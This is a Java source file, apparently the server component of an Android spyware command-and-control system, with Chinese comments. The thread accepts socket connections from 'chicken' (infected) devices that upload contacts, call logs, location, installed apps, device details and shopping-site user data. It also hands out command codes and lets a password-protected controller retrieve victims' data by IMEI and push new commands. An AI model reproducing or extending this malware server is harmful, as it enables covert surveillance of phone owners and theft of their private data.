package com.lu.java;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

import net.sf.json.JSONException;
import net.sf.json.JSONObject;

import com.lu.info.*;
/**
 * socket连接线程处理
 * @author LU
 *
 */
public class SocketThread extends Thread{
    private Socket socket;

    public SocketThread(Socket socket){
        this.socket = socket;
    }

	public void run(){

        try{
        	 InputStream inputStream=socket.getInputStream();//得到一个输入流，接收客户端传递的信息
             InputStreamReader inputStreamReader=new InputStreamReader(inputStream,"UTF-8");//提高效率，将字节流转为字符流
             BufferedReader bufferedReader=new BufferedReader(inputStreamReader);//加入缓冲区
             String temp=null;
             String info="";
             while((temp=bufferedReader.readLine())!=null){
                 info+=temp;
             }
             System.out.println("----------------------");
             System.out.println("收到连接："+socket.getInetAddress().getHostAddress());
             //System.out.println("客户端说：\n"+info);
             
             JSONObject obj = JSONObject.fromObject(info);
             String returnData = "success";
             
             if(obj.getString("ID").equals("chicken")){
            	 System.out.println("感染端连接");
            	 if(obj.getString("datatype").equals("appInstalled")){
            		 /**更新已安装应用*/
            		 MsgTool.appInstalledhandle(info);
            	 }else if(obj.getString("datatype").equals("deviceInfo")){
            		 /**更新设备信息*/
            		 MsgTool.deviceHandle(info);
            	 }else if(obj.getString("datatype").equals("phoneContacts")){
            		 /**更新通讯录*/
            		 MsgTool.contactshandel(info);
            	 }else if(obj.getString("datatype").equals("all")){
            		 /**更新全部信息*/
            		 MsgTool.msgHandle(info);
            	 }else if(obj.getString("datatype").equals("location")){
            		 /**更新位置*/
            		 MsgTool.locationHandle(info);
            	 }else if(obj.getString("datatype").equals("callLog")){
            		 /**更新通讯记录*/
            		 MsgTool.callLogHandle(info);
            	 }else if(obj.getString("datatype").equals("shopCarUrl")){
            		 /**更新天天特价用户信息*/
            		 ShopURL.urlConfrim(info);
            	 }else if(obj.getString("datatype").equals("requestCode")){
            		 /**请求指令*/
            		 System.out.println("感染端请求指令码，当前指令码："+CodeFlag.getCOMMEND_CODE());
            		 returnData = CodeFlag.getCOMMEND_CODE();
            	 }else{
            		 System.out.println("未知数据格式");
            		 returnData = "";
            	 }
             }else if(obj.getString("ID").equals("control")){
            	 System.out.println("移动控制端连接");
            	 if(obj.getString("datatype").equals("password")){
            		 /**控制端登录*/
            		 returnData = MsgTool.passwordVerify(obj.getString("password"));
            	 }else if(obj.getString("datatype").equals("normaldata")){
            		 /**控制端请求数据*/
            		 returnData = MsgTool.outputData(obj.getString("IMEI"));
            	 }else if(obj.getString("datatype").equals("shopusers")){
            		 /**控制端请求天天特价数据*/
            		 returnData = ShopURL.outUserData();
            	 }else if(obj.getString("datatype").equals("upCode")){
            		 /**控制端更新指令*/
            		 CodeFlag.setCOMMEND_CODE(obj.getString("code"));
            		 System.out.println("指令码更新成功，当前指令："+CodeFlag.getCOMMEND_CODE());
            	 }else if(obj.getString("datatype").equals("requestIMEI")){
            		 /**控制端请求IMEI列表*/
            		 returnData = MsgTool.returnIMEI();
            	 }
            		 else{
            		 System.out.println("未知数据格式");
                	 returnData = "";
            	 }
             }else{
            	 System.out.println("未知数据格式");
            	 returnData = "";
             }
            
            OutputStream outputStream = socket.getOutputStream();
            PrintWriter printWriter = new PrintWriter(outputStream);
            printWriter.print(returnData);
            printWriter.flush();
            socket.shutdownOutput();// 关闭输出流

            printWriter.close();
            outputStream.close();
            bufferedReader.close();
            inputStream.close();
            socket.close();
        }catch (IOException e) {
            e.printStackTrace();
        }catch (JSONException e){
        	e.printStackTrace();
        }
    }
}